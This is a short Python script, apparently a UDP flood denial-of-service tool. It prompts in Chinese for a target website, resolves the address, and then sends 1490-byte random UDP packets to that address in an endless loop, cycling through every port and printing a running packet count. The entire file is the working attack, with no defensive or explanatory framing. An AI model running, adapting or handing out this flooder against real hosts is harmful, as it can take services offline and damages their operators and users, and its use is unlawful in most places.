import sys
import os
import time
import socket
import random

def get_ip(url):
    try:
        hostname = socket.gethostbyname(url)
        return hostname
    except Exception as e:
        return str(e)


from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("网址(加不https://): ")
ip = get_ip(ip)
port = 0
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

